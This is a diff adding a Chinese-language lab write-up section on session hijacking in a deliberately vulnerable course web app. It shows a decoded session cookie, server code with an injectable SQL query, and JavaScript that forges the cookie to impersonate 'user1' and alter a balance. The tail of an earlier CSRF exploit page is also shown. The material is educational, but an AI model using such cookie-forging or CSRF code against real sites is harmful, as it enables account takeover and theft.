@@ -11,6 +11,7 @@
 - [Proj2](#proj2)
     + [Exploit Alpha Cookie Theft](#exploit-alpha-cookie-theft)
     + [Exploit Bravo Cross Site Request Forgery](#exploit-bravo-cross-site-request-forgery)
+    + [Exploit Charlie Session Hijacking with Cookies](#exploit-charlie-session-hijacking-with-cookies)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -1172,4 +1173,59 @@ app.use(cookieSession({
         <iframe style="width:0; height:0; border:0; border:none" name="iframe" onload="bye()"></iframe>
     </body>
 </html>
+```
+
+## Exploit Charlie Session Hijacking with Cookies
+题目的意思是，Login的时候是attacker，但想要登陆user1的账号，并完成转账。先来看下cookie中的session是什么鬼，可以看到，session其实是一串base64的编码
+```console
+$ document.cookie
+"session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwiaGFzaGVkUGFzc3dvcmQiOiIwZmM5MjFkY2NmY2IwNzExMzJlNzIzODVmMTBkOTFkY2IyMTM5ODM3OTJkZmU5M2RlOGI1ZDMyNzRiNWE1Y2Y1Iiwic2FsdCI6IjIxODM0NzA4NDkyOTcwODYwMzY4OTQwNzEwMTMxNTYwMjE4NzQxIiwicHJvZmlsZSI6IiIsImJpdGJhcnMiOjIwfX0="
+```
+用`atob()`解码看看
+```json
+"{\"loggedIn\":true,\"account\":{\"username\":\"attacker\",\"hashedPassword\":\"0fc921dccfcb071132e72385f10d91dcb213983792dfe93de8b5d3274b5a5cf5\",\"salt\":\"21834708492970860368940710131560218741\",\"profile\":\"\",\"bitbars\":0}}"
+```
+再看看服务器登陆的验证机制，发现只判断了`session.loggedIn`以及去db查询`username`是否在db里，所以可以直接更改`username`来劫持session
+```javascript
+router.get('/profile', asyncMiddleware(async (req, res, next) => {
+  if(req.session.loggedIn == false) {
+    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
+    return;
+  };
+
+  if(req.query.username != null) { // if visitor makes a search query
+    const db = await dbPromise;
+    const query = `SELECT * FROM Users WHERE username == "${req.query.username}";`;
+    let result;
+    try {
+      result = await db.get(query);
+    } catch(err) {
+      result = false;
+    }
+    if(result) { // if user exists
+      render(req, res, next, 'profile/view', 'View Profile', false, result);
+    }
+    else { // user does not exist
+      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
+    }
+  } else { // visitor did not make query, show them their own profile
+    render(req, res, next, 'profile/view', 'View Profile', false, req.session.account);
+  }
+}));
+```
+进行以下更改即可实现session劫持并完成转账
+```javascript
+function getCookie(name) {
+  var value = "; ".concat(document.cookie);
+  var parts = value.split("; ".concat(name).concat("="));
+  if (parts.length == 2) 
+    return parts.pop().split(";").shift();
+}
+var cookie = getCookie("session");
+var json = atob(cookie);
+var jsonObj = JSON.parse(json);
+jsonObj.account.username = "user1";
+jsonObj.account.bitbars = 200
+var user1Cookie = JSON.stringify(jsonObj);
+document.cookie = "session=".concat(btoa(user1Cookie));
 ```
